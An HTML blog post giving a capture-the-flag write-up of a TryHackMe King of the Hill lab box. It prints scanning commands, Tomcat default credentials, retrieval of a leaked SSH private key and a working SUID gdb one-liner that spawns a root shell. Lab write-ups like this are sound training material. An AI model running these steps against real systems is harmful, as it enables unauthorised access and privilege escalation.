@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>KOTH: Shrek | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe King of the Hill: Shrek. robots.txt discloses RSA private key path, homepage Base64 comment reveals username shrek, FTP anonymous access, SSH with cleaned private key, SUID gdb Python setuid for root, four flag files pulled.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/koth-shrek.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/koth-shrek.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="KOTH: Shrek">
+<meta property="og:description" content="TryHackMe King of the Hill: Shrek. robots.txt discloses RSA private key path, homepage Base64 comment reveals username shrek, FTP anonymous access, SSH with cleaned private key, SUID gdb Python setuid for root, four flag files pulled.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="KOTH: Shrek">
+<meta name="twitter:description" content="TryHackMe King of the Hill: Shrek. robots.txt discloses RSA private key path, homepage Base64 comment reveals username shrek, FTP anonymous access, SSH with cleaned private key, SUID gdb Python setuid for root, four flag files pulled.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">KOTH: Shrek</h1>
+    <div class="post-description">TryHackMe King of the Hill. CIAT Cybersecurity Club live competition on the Shrek box. Earn points by writing your name to the flag file, then defend it. robots.txt discloses an RSA key, Base64 comment reveals username shrek, SUID gdb for root.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>King of the Hill. CIAT Cybersecurity Club ran this as a live competition on the Shrek box. Two coaches, one student group. The rules: earn points by writing your name to the flag file, then defend it.</p>
+
+<p>The second coach rooted the first instance so fast no one could track the moves. I realized the KOTH flag file was at the bottom of the players list rather than where everyone expected it. The box got reset. In the second round, students were given a fighting chance. Then the primary coach proceeded to do laps around everyone once the student portion was complete.</p>
+
+<p>Two things learned about KOTH before you start:</p>
+
+<ol>
+<li>You do not <code>echo</code> the flag into the void. The box cannot see you.</li>
+<li>Keep the flame alive. The box will kick you out if you go quiet.</li>
+</ol>
+
+<p>I am officially hooked on this.</p>
+
+<h2>Reconnaissance</h2>
+
+<pre><code class="language-bash">nmap -sV -A -T4 TARGET_IP</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.24.58 AM.png" alt="Nmap scan results part 1 showing open ports on the Shrek box" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.25.21 AM.png" alt="Nmap scan results part 2 with full service version details" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>21/tcp FTP (vsftpd 3.0.2)</li>
+<li>22/tcp SSH (OpenSSH 7.4)</li>
+<li>80/tcp HTTP (Apache 2.4.6, CentOS, PHP/7.1.33)</li>
+<li>3306/tcp MySQL (unauthorized)</li>
+<li>8009/tcp AJP (Apache Jserv 1.3)</li>
+<li>8080/tcp HTTP (Apache Tomcat 7.0.88)</li>
+<li>9999/tcp HTTP (Golang net/http)</li>
+</ul>
+
+<p>Seven open ports. Tomcat on 8080 is the first thing to check. Default credentials (<code>tomcat:tomcat</code>, <code>admin:admin</code>, <code>tomcat:s3cret</code>) all fail.</p>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-17 at 9.00.03 PM.png" alt="Tomcat manager on port 8080 rejecting default credential attempts" style="max-width:100%;margin:2rem 0;">
+
+<p>Moving on.</p>
+
+<h2>Web enumeration</h2>
+
+<p><code>robots.txt</code> disclosing a file path is the classic robots.txt behavior in CTF environments:</p>
+
+<pre><code class="language-bash">curl -s http://TARGET_IP/robots.txt</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.32.55 AM.png" alt="curl robots.txt output showing Disallow: /Cpxtpt2hWCee9VFa.txt" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>Disallow: /Cpxtpt2hWCee9VFa.txt</code></pre>
+
+<p>Whatever that file is, it wasn&rsquo;t meant to be found. That means it was definitely meant to be found.</p>
+
+<pre><code class="language-bash">curl -s http://TARGET_IP/</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.28.22 AM.png" alt="Homepage source showing HTML comments with Base64 string and shrek is like an onion hint" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.32.11 AM.png" alt="Homepage fullscreen Shrek image with two HTML comments in the source" style="max-width:100%;margin:2rem 0;">
+
+<p>The homepage is a fullscreen image of Shrek. The source contains two HTML comments:</p>
+
+<pre><code class="language-html">&lt;!-- shrek is like an onion --&gt;
+&lt;!-- NzM2ODcyNjU2bzY5NzM2MTZzNnI2OTZzNnI= --&gt;</code></pre>
+
+<p>The Base64 string decodes to an obfuscated hex value. Parsing the valid hex digits alongside the &ldquo;shrek is like an onion&rdquo; comment makes the username apparent: <code>shrek</code>.</p>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-17 at 9.49.47 PM.png" alt="Base64 decode revealing obfuscated hex value and confirming username shrek" style="max-width:100%;margin:2rem 0;">
+
+<p>FTP allows anonymous login:</p>
+
+<pre><code class="language-bash">ftp TARGET_IP</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-17 at 9.05.06 PM.png" alt="FTP anonymous login to the Shrek box confirmed" style="max-width:100%;margin:2rem 0;">
+
+<p>Feroxbuster on port 9999 finds two endpoints:</p>
+
+<pre><code class="language-bash">feroxbuster -u http://TARGET_IP:9999 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+
+<p>Notable: <code>/migration</code> and <code>/plate</code>. Both return empty responses, but they are there.</p>
+
+<h2>RSA key extraction</h2>
+
+<p>The disallowed file is an RSA private key:</p>
+
+<pre><code class="language-bash">curl -s http://TARGET_IP/Cpxtpt2hWCee9VFa.txt -o id_rsa</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.28.22 AM.png" alt="curl downloading Cpxtpt2hWCee9VFa.txt as id_rsa" style="max-width:100%;margin:2rem 0;">
+
+<p>The key file has a problem. The original FTP and curl downloads carry blank lines between every PEM line, and OpenSSH will not parse a private key in that state. The fix:</p>
+
+<pre><code class="language-bash">sed -i '/^[[:space:]]*$/d' id_rsa
+chmod 600 id_rsa</code></pre>
+
+<p>Validate before attempting SSH:</p>
+
+<pre><code class="language-bash">ssh-keygen -y -f id_rsa >/dev/null && echo "KEY VALID"</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.16.06 AM.png" alt="ssh-keygen -y -f id_rsa returning KEY VALID after blank-line cleanup" style="max-width:100%;margin:2rem 0;">
+
+<p>That rebuilt it into a contiguous RSA PEM file and satisfied the private key permission check.</p>
+
+<h2>Initial access</h2>
+
+<pre><code class="language-bash">ssh -i ./id_rsa -o IdentitiesOnly=yes shrek@TARGET_IP</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-17 at 9.47.15 PM.png" alt="SSH login as shrek using the extracted private key" style="max-width:100%;margin:2rem 0;">
+
+<p>Success, but the box kicks you out if the session goes quiet. Keep the flame alive.</p>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-17 at 9.48.50 PM.png" alt="Session kicked for inactivity, demonstrating the KOTH keep-alive requirement" style="max-width:100%;margin:2rem 0;">
+
+<p>Back in:</p>
+
+<pre><code class="language-bash">ls -la
+cat flag.txt</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-17 at 9.50.41 PM.png" alt="ls -la and cat flag.txt showing user flag in shrek's home directory" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>User flag:</strong> <code>0069ba233da89efe6f48e7d214034130</code></p>
+
+<p><code>check.sh</code> is a root-owned script in shrek&rsquo;s home directory:</p>
+
+<pre><code class="language-bash">cat check.sh</code></pre>
+
+<pre><code class="language-bash">#!/bin/bash
+date > /tmp/timecheck</code></pre>
+
+<p>A KOTH housekeeping script. Writing the current time to <code>/tmp/timecheck</code> every minute. This is what kicks you out if the session goes quiet.</p>
+
+<h2>Privilege escalation via SUID gdb</h2>
+
+<p>Enumerate SUID binaries:</p>
+
+<pre><code class="language-bash">find / -perm -4000 -type f 2>/dev/null</code></pre>
+
+<p><code>/usr/bin/gdb</code> has the SUID bit set. gdb has Python support. This is the path.</p>
+
+<pre><code class="language-bash">gdb -nx -ex 'python import os; os.setuid(0); os.execl("/bin/bash","bash","-p")' -ex quit</code></pre>
+
+<p>This launches gdb, uses its embedded Python to call <code>setuid(0)</code>, then replaces the process with a privileged Bash shell. It works because gdb runs with root&rsquo;s effective user ID via the SUID bit.</p>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-17 at 9.55.40 PM.png" alt="gdb SUID Python setuid exploit landing a root shell" style="max-width:100%;margin:2rem 0;">
+
+<p>ROOT.</p>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.19.19 AM.png" alt="Root shell confirmed after gdb setuid(0) exploit" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Root flag:</strong> <code>8cc6ece048e6c42251c411814ff5a22d</code></p>
+
+<h2>All four flag files</h2>
+
+<p>From the root shell:</p>
+
+<pre><code class="language-bash">find /home /root -type f \( -iname '*flag*' -o -iname 'user.txt' -o -iname 'root.txt' \) -ls 2>/dev/null</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.17.13 AM.png" alt="find command listing all four flag files across /home and /root" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">cat /home/shrek/flag.txt
+cat /home/donkey/flag.txt
+cat /home/puss/flag.txt
+cat /root/root.txt</code></pre>
+
+<img src="/images/koth-shrek/Screenshot 2026-06-18 at 6.41.10 AM.png" alt="cat output showing all four flag values for shrek, donkey, puss, and root" style="max-width:100%;margin:2rem 0;">
+
+<ul>
+<li><strong>shrek:</strong> <code>0069ba233da89efe6f48e7d214034130</code></li>
+<li><strong>donkey:</strong> (see screenshot)</li>
+<li><strong>puss:</strong> <code>6f960e8f2ea8e3de92f192fae492ec59</code></li>
+<li><strong>root:</strong> <code>8cc6ece048e6c42251c411814ff5a22d</code></li>
+</ul>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>Nmap
+  -&gt; 7 open ports: FTP, SSH, HTTP/80, MySQL, AJP, Tomcat/8080, Golang/9999
+  -&gt; Tomcat default creds: all fail
+  -&gt; robots.txt: Cpxtpt2hWCee9VFa.txt disclosed
+  -&gt; homepage source: "shrek is like an onion" + Base64 obfuscated hex -&gt; username: shrek
+  -&gt; Cpxtpt2hWCee9VFa.txt: RSA private key (blank lines between PEM lines)
+  -&gt; sed fix: removed blank lines, chmod 600, validated with ssh-keygen
+  -&gt; SSH as shrek with fixed key
+  -&gt; user.txt: 0069ba233da89efe6f48e7d214034130
+  -&gt; find SUID: /usr/bin/gdb
+  -&gt; gdb Python setuid(0) + execl bash: root shell
+  -&gt; root.txt: 8cc6ece048e6c42251c411814ff5a22d
+  -&gt; find /home /root: four flag files pulled</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
